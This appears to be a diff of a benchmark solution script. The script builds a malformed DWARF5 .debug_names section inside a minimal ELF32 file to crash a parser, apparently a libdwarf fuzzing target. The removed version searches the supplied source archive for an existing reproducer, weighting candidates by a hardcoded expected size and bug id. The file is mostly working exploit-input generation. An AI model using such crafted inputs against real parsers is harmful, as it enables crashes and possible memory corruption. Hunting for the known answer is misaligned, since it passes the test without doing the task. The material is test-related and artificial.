@@ -1,377 +1,285 @@
 import os
 import io
-import tarfile
-import zipfile
+import re
 import struct
-from typing import Optional, Tuple, Iterable
+import tarfile
+from typing import List, Tuple, Optional
 
 
-def _is_probably_archive(path: str) -> bool:
-    lp = path.lower()
-    return lp.endswith((".tar", ".tar.gz", ".tgz", ".tar.bz2", ".tbz2", ".tar.xz", ".txz", ".zip"))
-
-
-def _score_candidate(name: str, size: int) -> int:
-    lname = name.lower()
-    score = 0
-
-    if "383170474" in lname:
-        score += 5000
-    if "oss-fuzz" in lname or "ossfuzz" in lname:
-        score += 600
-    for kw in ("clusterfuzz", "testcase", "minimized", "poc", "crash", "repro", "asan", "ubsan", "msan", "regression"):
-        if kw in lname:
-            score += 500
-    for kw in ("debug_names", "debug-names", "debugnames"):
-        if kw in lname:
-            score += 250
-
-    if lname.endswith((".bin", ".elf", ".o", ".obj", ".a", ".ar", ".dat", ".dwarf", ".input", ".corpus", ".crash")):
-        score += 120
-
-    # Strong bias towards the known ground-truth size
-    if size == 1551:
-        score += 2000
-    else:
-        d = abs(size - 1551)
-        score += max(0, 300 - (d // 2))
-        score += max(0, 120 - (d // 10))
-
-    if size <= 0:
-        score -= 1000
-    if size > 5_000_000:
-        score -= 2000
-
-    return score
-
-
-def _read_magic_from_fileobj(f) -> bytes:
-    try:
-        pos = f.tell()
-    except Exception:
-        pos = None
-    try:
-        b = f.read(4)
-    finally:
-        try:
-            if pos is not None:
-                f.seek(pos)
-        except Exception:
-            pass
-    return b or b""
-
-
-def _find_poc_in_tar(tar_path: str) -> Optional[bytes]:
-    best: Optional[Tuple[int, int, tarfile.TarInfo]] = None  # (score, size, member)
-    with tarfile.open(tar_path, "r:*") as tf:
-        members = tf.getmembers()
-        for m in members:
-            if not m.isfile():
-                continue
-            size = int(getattr(m, "size", 0) or 0)
-            if size <= 0 or size > 5_000_000:
-                continue
-            name = m.name
-            score = _score_candidate(name, size)
-
-            if score > 200:
-                try:
-                    f = tf.extractfile(m)
-                    if f is not None:
-                        with f:
-                            magic = _read_magic_from_fileobj(f)
-                            if magic == b"\x7fELF":
-                                score += 400
-                except Exception:
-                    pass
-
-            if best is None or score > best[0] or (score == best[0] and size < best[1]):
-                best = (score, size, m)
-
-        if best is None:
-            return None
-
-        try:
-            f = tf.extractfile(best[2])
-            if f is None:
-                return None
-            with f:
-                return f.read()
-        except Exception:
-            return None
-
-
-def _find_poc_in_zip(zip_path: str) -> Optional[bytes]:
-    best: Optional[Tuple[int, int, str]] = None  # (score, size, name)
-    with zipfile.ZipFile(zip_path, "r") as zf:
-        for zi in zf.infolist():
-            if zi.is_dir():
-                continue
-            size = int(getattr(zi, "file_size", 0) or 0)
-            if size <= 0 or size > 5_000_000:
-                continue
-            name = zi.filename
-            score = _score_candidate(name, size)
-
-            if score > 200:
-                try:
-                    with zf.open(zi, "r") as f:
-                        magic = _read_magic_from_fileobj(f)
-                        if magic == b"\x7fELF":
-                            score += 400
-                except Exception:
-                    pass
-
-            if best is None or score > best[0] or (score == best[0] and size < best[1]):
-                best = (score, size, name)
-
-        if best is None:
-            return None
-        try:
-            return zf.read(best[2])
-        except Exception:
-            return None
-
-
-def _find_poc_in_dir(dir_path: str) -> Optional[bytes]:
-    best: Optional[Tuple[int, int, str]] = None  # (score, size, path)
-    for root, _, files in os.walk(dir_path):
-        for fn in files:
-            p = os.path.join(root, fn)
-            try:
-                st = os.stat(p)
-            except Exception:
-                continue
-            size = int(st.st_size)
-            if size <= 0 or size > 5_000_000:
-                continue
-            rel = os.path.relpath(p, dir_path)
-            score = _score_candidate(rel, size)
-
-            if score > 200:
-                try:
-                    with open(p, "rb") as f:
-                        magic = f.read(4)
-                    if magic == b"\x7fELF":
-                        score += 400
-                except Exception:
-                    pass
-
-            if best is None or score > best[0] or (score == best[0] and size < best[1]):
-                best = (score, size, p)
-
-    if best is None:
-        return None
-    try:
-        with open(best[2], "rb") as f:
-            return f.read()
-    except Exception:
-        return None
-
-
-def _uleb128(x: int) -> bytes:
-    if x < 0:
-        x = 0
-    out = bytearray()
-    while True:
-        b = x & 0x7F
-        x >>= 7
-        if x:
-            out.append(b | 0x80)
-        else:
-            out.append(b)
-            break
-    return bytes(out)
-
-
-def _build_debug_names_section_fallback() -> bytes:
-    # Minimal-ish DWARF5 .debug_names unit (64-bit DWARF format) with slightly inconsistent fields.
-    # Intended only as a fallback if no embedded PoC is found.
+def _build_debug_info_minimal_dwarf5() -> bytes:
+    # Minimal DWARF5 CU with no DIEs: abbrev code 0 terminator.
     version = 5
-    padding = 0
-    comp_unit_count = 0
-    local_type_unit_count = 0
-    foreign_type_unit_count = 0
-    bucket_count = 1
-    name_count = 1
-    augmentation_string = b""
-    augmentation_string_size = len(augmentation_string)
+    unit_type = 0x01  # DW_UT_compile
+    address_size = 4  # for ELF32
+    abbrev_offset = 0
+    body = struct.pack("<HBBI", version, unit_type, address_size, abbrev_offset) + b"\x00"
+    unit_length = len(body)
+    return struct.pack("<I", unit_length) + body
 
-    # Abbrev table: one abbrev, then terminator.
-    # abbrev_code=1, tag=1, attr_count=0, terminator abbrev_code=0
-    abbrev_table = _uleb128(1) + _uleb128(1) + _uleb128(0) + _uleb128(0)
-    abbrev_table_size = len(abbrev_table)
 
-    offset_size = 8
-    buckets = struct.pack("<I", 1)
-    hashes = struct.pack("<I", 0)
-    string_offsets = struct.pack("<Q", 0)
-    entry_offsets = struct.pack("<Q", 0)
-    entry_pool = _uleb128(1)  # one entry: abbrev_code=1
+def _build_debug_abbrev_minimal() -> bytes:
+    # Single 0 byte marks end of abbreviations.
+    return b"\x00"
 
-    header_fixed = struct.pack(
-        "<HHIIIIIIII",
-        version,
-        padding,
-        comp_unit_count,
-        local_type_unit_count,
-        foreign_type_unit_count,
-        bucket_count,
-        name_count,
-        abbrev_table_size,
-        augmentation_string_size,
-        0,  # spare / future, some implementations read extra; keep 0 to be conservative
+
+def _build_debug_str_minimal() -> bytes:
+    return b"\x00"
+
+
+def _build_debug_names_poc(bucket_count: int = 1, name_count: int = 64,
+                           abbrev_table_size: int = 1, augmentation_string_size: int = 1) -> bytes:
+    # DWARF5 .debug_names unit with potentially dangerous mismatch between bucket_count and name_count.
+    # Header after unit_length:
+    # version u2, padding u2,
+    # cu_count u4, local_tu_count u4, foreign_tu_count u4,
+    # bucket_count u4, name_count u4, abbrev_table_size u4, augmentation_string_size u4
+    header = struct.pack(
+        "<HHIIIIIII",
+        5, 0,
+        0, 0, 0,
+        bucket_count, name_count, abbrev_table_size, augmentation_string_size
     )
-    # Note: The real header has exactly 9 4-byte fields after the 2+2; the last 0 is extra.
-    # To avoid breaking common parsers too early, we'll drop it if needed.
-    header_fixed = header_fixed[:-4]
 
-    payload = bytearray()
-    payload += header_fixed
-    payload += augmentation_string
-    payload += buckets
-    payload += hashes
-    payload += string_offsets
-    payload += entry_offsets
-    payload += abbrev_table
-    payload += entry_pool
+    aug = (b"\x00" * augmentation_string_size) if augmentation_string_size else b""
 
-    # 64-bit unit header
-    unit_length_64 = len(payload)
-    out = bytearray()
-    out += struct.pack("<I", 0xFFFFFFFF)
-    out += struct.pack("<Q", unit_length_64)
-    out += payload
-    return bytes(out)
+    # No CU/TU/foreign arrays (counts are 0).
+
+    # Buckets: u4[bucket_count]. Use 1-based index into hash array. 0 means empty.
+    buckets = b""
+    if bucket_count > 0:
+        buckets = struct.pack("<" + "I" * bucket_count, *([1] + [0] * (bucket_count - 1)))
+
+    # Hashes u4[name_count]
+    # Choose monotonically increasing to satisfy potential expectations.
+    hashes = struct.pack("<" + "I" * name_count, *list(range(1, name_count + 1)))
+
+    # String offsets u4[name_count] -> all 0 => points to empty string in .debug_str
+    str_offs = b"\x00" * (4 * name_count)
+
+    # Entry offsets u4[name_count] -> all 0 => points to start of entry pool
+    entry_offs = b"\x00" * (4 * name_count)
+
+    # Abbrev table: provide a single 0 ULEB to terminate abbreviations
+    abbrev_table = b"\x00" * max(0, abbrev_table_size)
+
+    # Entry pool: provide a single 0 ULEB to terminate entry list
+    entry_pool = b"\x00"
+
+    content = header + aug + buckets + hashes + str_offs + entry_offs + abbrev_table + entry_pool
+    unit_length = len(content)
+    return struct.pack("<I", unit_length) + content
 
 
-def _align(n: int, a: int) -> int:
-    return (n + (a - 1)) & ~(a - 1)
+def _align_up(x: int, a: int) -> int:
+    if a <= 1:
+        return x
+    return (x + (a - 1)) & ~(a - 1)
 
 
-def _build_minimal_elf_with_sections(debug_names: bytes, debug_str: bytes) -> bytes:
-    # Minimal ELF64 little-endian relocatable with .debug_names and .debug_str
-    shstr = b"\x00.shstrtab\x00.debug_names\x00.debug_str\x00"
-    off_shstrtab = 1
-    off_debug_names = off_shstrtab + len(b".shstrtab") + 1
-    off_debug_str = off_debug_names + len(b".debug_names") + 1
+def _build_elf32_rel(sections: List[Tuple[str, int, int, int, bytes]]) -> bytes:
+    # sections: (name, sh_type, sh_flags, sh_addralign, data)
+    # We'll build: [NULL, .shstrtab, ...sections...]
+    # Elf32_Ehdr: 52 bytes, Elf32_Shdr: 40 bytes.
 
-    ehdr_size = 64
-    shdr_size = 64
-    shnum = 4
-    shstrndx = 1
+    # Build shstrtab
+    names = ["", ".shstrtab"] + [s[0] for s in sections]
+    shstrtab = b"\x00"
+    name_offsets = [0]
+    for n in names[1:]:
+        name_offsets.append(len(shstrtab))
+        shstrtab += n.encode("ascii", "strict") + b"\x00"
 
-    data = bytearray(b"\x00" * ehdr_size)
+    # Layout
+    ehdr_size = 52
+    file_off = ehdr_size
 
-    cur = ehdr_size
-    cur = _align(cur, 8)
-    debug_names_off = cur
-    data += b"\x00" * (debug_names_off - len(data))
-    data += debug_names
-    cur = len(data)
+    # Section 0: NULL
+    shdrs = []
 
-    cur = _align(cur, 8)
-    debug_str_off = cur
-    data += b"\x00" * (debug_str_off - len(data))
-    data += debug_str
-    cur = len(data)
+    # Section 1: shstrtab
+    shstrtab_align = 1
+    file_off = _align_up(file_off, shstrtab_align)
+    shstrtab_off = file_off
+    shstrtab_size = len(shstrtab)
+    file_off += shstrtab_size
 
-    cur = _align(cur, 8)
-    shstrtab_off = cur
-    data += b"\x00" * (shstrtab_off - len(data))
-    data += shstr
-    cur = len(data)
+    sec_offsets = [0, shstrtab_off]
+    sec_sizes = [0, shstrtab_size]
 
-    cur = _align(cur, 8)
-    shoff = cur
-    data += b"\x00" * (shoff - len(data))
+    # Other sections
+    for (name, sh_type, sh_flags, sh_align, data) in sections:
+        sh_align = max(1, int(sh_align))
+        file_off = _align_up(file_off, sh_align)
+        sec_offsets.append(file_off)
+        sec_sizes.append(len(data))
+        file_off += len(data)
 
-    def shdr(sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size, sh_link, sh_info, sh_addralign, sh_entsize):
-        return struct.pack(
-            "<IIQQQQIIQQ",
-            sh_name,
-            sh_type,
-            sh_flags,
-            sh_addr,
-            sh_offset,
-            sh_size,
-            sh_link,
-            sh_info,
-            sh_addralign,
-            sh_entsize,
-        )
+    # Section header table
+    shentsize = 40
+    shnum = 2 + len(sections)
+    shoff = _align_up(file_off, 4)
+    file_size = shoff + shentsize * shnum
 
-    # Section headers
-    sh_null = shdr(0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
-    sh_shstrtab = shdr(off_shstrtab, 3, 0, 0, shstrtab_off, len(shstr), 0, 0, 1, 0)
-    sh_debug_names = shdr(off_debug_names, 1, 0, 0, debug_names_off, len(debug_names), 0, 0, 1, 0)
-    sh_debug_str = shdr(off_debug_str, 1, 0, 0, debug_str_off, len(debug_str), 0, 0, 1, 0)
+    out = bytearray(b"\x00" * file_size)
 
-    data += sh_null + sh_shstrtab + sh_debug_names + sh_debug_str
+    # Write section contents
+    out[shstrtab_off:shstrtab_off + shstrtab_size] = shstrtab
+
+    for i, (_, _, _, _, data) in enumerate(sections, start=2):
+        off = sec_offsets[i]
+        out[off:off + len(data)] = data
 
     # ELF header
     e_ident = bytearray(16)
     e_ident[0:4] = b"\x7fELF"
-    e_ident[4] = 2  # ELFCLASS64
+    e_ident[4] = 1  # ELFCLASS32
     e_ident[5] = 1  # ELFDATA2LSB
     e_ident[6] = 1  # EV_CURRENT
-    e_ident[7] = 0  # System V
-
-    e_type = 1  # ET_REL
-    e_machine = 62  # EM_X86_64
+    e_ident[7] = 0  # ELFOSABI_NONE
+    e_type = 1       # ET_REL
+    e_machine = 3    # EM_386
     e_version = 1
     e_entry = 0
     e_phoff = 0
-    e_shoff = shoff
     e_flags = 0
     e_ehsize = ehdr_size
     e_phentsize = 0
     e_phnum = 0
-    e_shentsize = shdr_size
+    e_shentsize = shentsize
     e_shnum = shnum
-    e_shstrndx = shstrndx
+    e_shstrndx = 1
 
     ehdr = struct.pack(
-        "<16sHHIQQQIHHHHHH",
+        "<16sHHIIIIIHHHHHH",
         bytes(e_ident),
-        e_type,
-        e_machine,
-        e_version,
-        e_entry,
-        e_phoff,
-        e_shoff,
+        e_type, e_machine, e_version,
+        e_entry, e_phoff, shoff,
         e_flags,
-        e_ehsize,
-        e_phentsize,
-        e_phnum,
-        e_shentsize,
-        e_shnum,
-        e_shstrndx,
+        e_ehsize, e_phentsize, e_phnum,
+        e_shentsize, e_shnum, e_shstrndx
     )
-    data[0:ehdr_size] = ehdr
-    return bytes(data)
+    out[0:ehdr_size] = ehdr
+
+    # Section headers
+    def shdr_pack(sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size, sh_link, sh_info, sh_addralign, sh_entsize):
+        return struct.pack("<IIIIIIIIII", sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size, sh_link, sh_info, sh_addralign, sh_entsize)
+
+    # 0: NULL
+    shdrs.append(shdr_pack(0, 0, 0, 0, 0, 0, 0, 0, 0, 0))
+    # 1: shstrtab
+    shdrs.append(shdr_pack(name_offsets[1], 3, 0, 0, shstrtab_off, shstrtab_size, 0, 0, 1, 0))
+
+    # Others
+    for idx, (name, sh_type, sh_flags, sh_align, data) in enumerate(sections, start=2):
+        sh_name = name_offsets[idx]
+        sh_offset = sec_offsets[idx]
+        sh_size = len(data)
+        sh_addralign = max(1, int(sh_align))
+        shdrs.append(shdr_pack(sh_name, int(sh_type), int(sh_flags), 0, sh_offset, sh_size, 0, 0, sh_addralign, 0))
+
+    shdr_blob = b"".join(shdrs)
+    out[shoff:shoff + len(shdr_blob)] = shdr_blob
+    return bytes(out)
+
+
+def _detect_input_style_from_src(src_path: str) -> str:
+    # Returns "elf" or "raw"
+    # Heuristic: if fuzzer harness mentions elf/dwarf_elf, assume ELF. If it appears to use
+    # raw section data without ELF, assume RAW. Default ELF.
+    patterns_elf = [
+        b"dwarf_elf_init", b"dwarf_elf_object_access_init", b"elf_begin", b"libelf", b"ELF"
+    ]
+    patterns_raw = [
+        b"dwarf_object_init_b", b"get_section_info", b".debug_names"
+    ]
+
+    def check_blob(blob: bytes) -> Optional[str]:
+        if b"LLVMFuzzerTestOneInput" not in blob:
+            return None
+        if any(p in blob for p in patterns_elf):
+            return "elf"
+        # If it uses dwarf_object_init_b with custom access and doesn't mention elf.
+        if (b"dwarf_object_init_b" in blob) and (b"elf_" not in blob) and (b"dwarf_elf" not in blob):
+            return "raw"
+        # If it explicitly treats input as a section buffer
+        if (b".debug_names" in blob) and (b"elf_" not in blob) and (b"dwarf_elf" not in blob):
+            return "raw"
+        if any(p in blob for p in patterns_raw) and (b"elf_" not in blob) and (b"dwarf_elf" not in blob):
+            return "raw"
+        return None
+
+    def iter_source_blobs_from_dir(d: str):
+        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx"}
+        for root, _, files in os.walk(d):
+            for fn in files:
+                _, ext = os.path.splitext(fn)
+                if ext.lower() not in exts:
+                    continue
+                p = os.path.join(root, fn)
+                try:
+                    st = os.stat(p)
+                    if st.st_size > 2_000_000:
+                        continue
+                    with open(p, "rb") as f:
+                        yield f.read()
+                except OSError:
+                    continue
+
+    def iter_source_blobs_from_tar(tar_path: str):
+        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx"}
+        try:
+            with tarfile.open(tar_path, "r:*") as tf:
+                for m in tf.getmembers():
+                    if not m.isreg():
+                        continue
+                    name = m.name
+                    _, ext = os.path.splitext(name)
+                    if ext.lower() not in exts:
+                        continue
+                    if m.size > 2_000_000:
+                        continue
+                    try:
+                        f = tf.extractfile(m)
+                        if not f:
+                            continue
+                        blob = f.read()
+                        yield blob
+                    except Exception:
+                        continue
+        except Exception:
+            return
+
+    it = iter_source_blobs_from_dir(src_path) if os.path.isdir(src_path) else iter_source_blobs_from_tar(src_path)
+    for blob in it:
+        r = check_blob(blob)
+        if r:
+            return r
+    return "elf"
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Attempt to locate an embedded reproducer in the provided source tarball/directory.
-        poc = None
-        try:
-            if os.path.isdir(src_path):
-                poc = _find_poc_in_dir(src_path)
-            else:
-                lp = src_path.lower()
-                if lp.endswith(".zip"):
-                    poc = _find_poc_in_zip(src_path)
-                else:
-                    poc = _find_poc_in_tar(src_path)
-        except Exception:
-            poc = None
+        style = _detect_input_style_from_src(src_path)
 
-        if poc:
-            return poc
+        debug_names = _build_debug_names_poc(
+            bucket_count=1,
+            name_count=64,
+            abbrev_table_size=1,
+            augmentation_string_size=1,
+        )
 
-        # Fallback: generate a minimal ELF containing a .debug_names section.
-        debug_names = _build_debug_names_section_fallback()
-        debug_str = b"\x00A\x00"
-        return _build_minimal_elf_with_sections(debug_names, debug_str)
+        if style == "raw":
+            return debug_names
+
+        debug_info = _build_debug_info_minimal_dwarf5()
+        debug_abbrev = _build_debug_abbrev_minimal()
+        debug_str = _build_debug_str_minimal()
+
+        # Build minimal ELF32 relocatable containing required DWARF sections.
+        sec_list = [
+            (".debug_info", 1, 0, 1, debug_info),
+            (".debug_abbrev", 1, 0, 1, debug_abbrev),
+            (".debug_names", 1, 0, 1, debug_names),
+            (".debug_str", 1, 0, 1, debug_str),
+        ]
+        return _build_elf32_rel(sec_list)
